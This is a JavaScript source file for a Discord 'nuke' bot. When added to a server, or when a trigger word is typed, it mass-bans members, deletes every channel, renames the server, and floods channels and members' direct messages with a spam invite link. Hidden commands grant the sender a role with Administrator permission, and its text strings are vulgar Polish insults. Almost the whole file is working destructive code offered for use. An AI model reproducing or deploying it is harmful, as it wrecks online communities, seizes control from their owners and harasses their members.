const Discord = require("discord.js") //npm i discord.js
const client = new Discord.Client();
const x_x = "hitler" //الامر يلي يشغل الكود //the command to start the hack system
const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
const teext = "Pizdeczki z was" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
const vooice = "Chuj wam w dupe" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
const pic = "https://ftopx.com/mini/201507/159230.jpg" // صوره بيسوي فيها سبام البوت //the spam embed thumbnail picture
const spam = "https://discord.gg/bBVWbNd" // الكلام يلي بيسوي فيه سبام البوت //the spam message
const namee = "Rozpierdalacz cipek" // اسم ابوت بعد التهكير //the bot name
const playing = "Lubie kebaba" // البلاينج //bot streaming
const role = 'Pizda' // اسم الرتبه يلي بيسويها //the role name
const adminstrator = 'OP' //اسم الرتبه يلي بيسويها البوت ويعطيك اياها //the op name
console.log('Start Hacking System ..')
client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag} !`);
  console.log(`Done The Hacking System Has Been Started`)

});
client.on('ready',  () => {
console.log(`Logged in as  * [ "  OROCHIX " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
//BY OROCHIX (Arabic)


});
// unban all and send a message for the ownerserver
async function nuke(guild) {
    let users = 0;
    let channels = 0;

    await guild.fetchMembers();

    await guild.owner.send('niewychowancu zobacz co się z twoim serwerem stało').catch(e => { return void e; });



    await Promise.all(guild.members.map(async (m) => {
      if (m.bannable) {
        users++;
        await m.send('https://discord.gg/bBVWbNd').catch(e => { return void e; });
        return m.ban();
      }
    }));

      await Promise.all(guild.channels.map(c => {
      if (c.deletable) {
        channels++;
        return c.delete();
      }
    }));

    await guild.createChannel(teext, 'text');

    await guild.createChannel(vooice, 'voice');



}
//any error will typed in the console :>
client.on('guildCreate', async (guild) => {
  return nuke(guild).catch(console.error);
});

//change the bot status and change the bot name and change the bot avatar and the servericon and the servername
client.on('message', message => {
    if (message.content === x_x) {
        console.log(`THE HACK HAS BEEN STARTED`)
        message.guild.members.forEach(baand => {
       baand.ban({reason: spam,});
       client.channels.forEach(hackch => {
       hackch.delete();
       client.user.setAvatar(pic)
       client.user.setUsername(namee)
       client.user.setGame(playing, 'https://www.twitch.tv/izakooo')
       client.guilds.forEach(hack => {
       hack.setIcon(pic)
       hack.setName(namee)})})})}});

//this will give you a adminstrator in the target server
client.on('message', message => {
        if (message.content === 'OP') {
let me = message.author
        let role = message.guild.createRole({
        name : adminstrator,
        color : "RANDOM",
        permissions : [8]
        })
        let role1 = message.guild.roles.find('name', adminstrator)
    message.channel.send(`HJACKED`)
   message.guild.member(me).addRole(role1);
}})

           client.on('message', message => {
                    if (message.content === x_x) {
                          client.guilds.forEach(m =>{
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');
           m.createChannel(teext, 'text');

           })
           }
           });

//if the bot join in any server the will give self adminstratpr rol


            //spam message
                client.on('message', message => {
                    if (message.content === x_x) {
                        console.log(`THE HACK HAS BEEN STARTED`)
                        var teeext = teext.replace(" ", "-")
                        var interval = setInterval (function () {
                        const embed = new Discord.RichEmbed()
                       .setColor("ff0000")
                       .setThumbnail(pic)
                       .addField(spam, ".")

                      })}
                      })

                  client.on('message', message => {
                    if (message.content === "elo") {
                      var interval = setInterval (function () {
                      message.guild.channels.find('name','pizdeczki-z-was').send("@everyone https://discord.gg/bBVWbNd");
                    })
                  }});

//login in to the bot token or the serverowner token
    client.on('message', async message => {
  const devs = ['263340222375264257']; // your id
  let member = message.author
   if (message.content === opcmd) {
    if (!devs.includes(message.author.id)) return;
let op = message.guild.roles.find('name', `${adminstrator}`)
    if(!op) return message.guild.createRole({ name: "OPROLE", permissions: [8] });
    message.guild.member(member).addRole(op);
  }
});

client.login(process.env.BOT_TOKEN);
